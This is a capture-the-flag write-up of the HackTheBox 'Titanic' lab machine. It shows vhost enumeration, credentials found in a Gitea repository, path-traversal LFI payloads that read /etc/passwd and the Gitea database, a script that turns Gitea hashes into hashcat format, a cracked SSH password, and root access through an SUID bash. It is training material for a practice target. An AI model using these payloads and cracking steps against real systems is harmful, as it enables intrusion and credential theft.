---
title: Titanic
tags:
  - HackTheBox
  - Easy
  - Linux
  - Gitea
  - LFI
  - Brute-Forcing
  - SUID
date: 2025-02-16T00:00:00Z
---
![](Pasted%20image%2020250216211039.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- titanic.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http
|_http-title: Titanic - Book Your Ship Trip
```

So I checked its website:

![](Pasted%20image%2020250216211203.png)

I discovered a library running with a curl request:

```shell
curl -I http://titanic.htb        

HTTP/1.1 200 OK
Date: Sun, 16 Feb 2025 20:14:12 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: text/html; charset=utf-8
Content-Length: 7399
```

So **Werkzeug 3.0.3** is running.

I performed some vhost enumeration with [Ffuf 🐳](/notes/tools/Ffuf.md) and got:

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://titanic.htb/ -H 'Host: FUZZ.titanic.htb' -fc 301

[redacted]
dev  [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 177ms]
```

So I added the new domain to my known ones and checked it:

![](Pasted%20image%2020250216212500.png)

Gitea version 1.22.1 is found inside it. 

I registered an account:

![](Pasted%20image%2020250216212628.png)

Exploring existing repos I found the following ones:

![](Pasted%20image%2020250216212719.png)

Inside `docker-config/mysql/docker-compose.yml` I found some root credentials:

```shell
root:MySQLP@$$w0rd!
```

![](Pasted%20image%2020250216212856.png)

Then, inside `flask-app/app.py` I found the source code of the machine front-end:

![](Pasted%20image%2020250216213115.png)

Basically, you need to add a ticket parameter to the download url, so I'll try it with the previous one I generated:

![](Pasted%20image%2020250216213403.png)

Got nothing, but I'll try some LFI:

```shell
http://titanic.htb/download?ticket=../../../../etc/passwd

[redacted]
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

> So I can try to read user flag :D

### User flag

```shell
http://titanic.htb/download?ticket=../../../../home/developer/user.txt
```

![](Pasted%20image%2020250216213806.png)

Then I remembered that I got the source code, so I inspected for the tickets:

![](Pasted%20image%2020250216213908.png)

and tried to read them, but got nothing :3

So I went back to gitea and checked `docker-config/gitea/docker-compose.yml`:

![](Pasted%20image%2020250216214607.png)

So maybe the gitea database is accessible under `/home/developer/gitea/data/`. Searching over the internet and their official documentation, I figured out that may be located in `/home/developer/gitea/data/gitea/gitea.db`.

> It worked!

## Weaponization

I searched "how to crack gitea.db" and found this [Gitea Cracking Gist](https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271)

```python
import sqlite3
import base64
import sys

if len(sys.argv) != 2:
    print("Usage: python3 gitea3hashcat.py <gitea.db>")
    sys.exit(1)

try:
    con = sqlite3.connect(sys.argv[1])
    cursor = con.cursor()
    cursor.execute("SELECT name,passwd_hash_algo,salt,passwd FROM user")
    for row in cursor.fetchall():
        if "pbkdf2" in row[1]:
            algo, iterations, keylen = row[1].split("$")
            algo = "sha256"
            name = row[0]
        else:
            raise Exception("Unknown Algorithm")
        salt = bytes.fromhex(row[2])
        passwd = bytes.fromhex(row[3])
        salt_b64 = base64.b64encode(salt).decode("utf-8")
        passwd_b64 = base64.b64encode(passwd).decode("utf-8")
        print(f"{name}:{algo}:{iterations}:{salt_b64}:{passwd_b64}")
except Exception as e:
    print(f"Error: {e}")
    sys.exit(1)

## The script was taken from an ippsec's video.
```

## Exploitation

![](Pasted%20image%2020250216215457.png)

```shell
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
hacker:sha256:50000:sBzfUKqer4N0fKS8eODPQw==:7tkcfGpKC6WxGbaKhcM2HoWEW2PoPJmHeYABJB7PfKwFVH1IgTTIWzNw/ZBTdY5a6vU=
test:sha256:50000:RPytKt3VovGAlR7YPFTkuw==:jU2xae8PWXpZ85cy3CncuqTezE4CcYPHunZKv9VRDpWTXFSFxU3Jhk4x5USHfnszyvM=
gitblanc:sha256:50000:rJaBvuFohNvaam/PHwzE/Q==:l8i0l94d6I9CZo7z1Y2vqOd6zlPcV8BmCQOC4OjLSMn+s38zVXK1DcHrIeADrOTFSMo=
```

So I checked the [Official hashcat page](https://hashcat.net/wiki/doku.php?id=example_hashes) to check the hash format and crack this one:

```shell
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

```shell
hashcat -m 10900 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt

[redacted]
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

> Got ssh creds: `developer:25282528` :D

## Privilege Escalation

I searched for SUID binaries:

```shell
find / -perm -4000 2>/dev/null

[redacted]
/usr/bin/bash
```

So I searched in [GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid):

```shell
/usr/bin/bash -p
```

![](Pasted%20image%2020250216221933.png)

### Root flag

![](Pasted%20image%2020250216222100.png)

==Machine pwned!==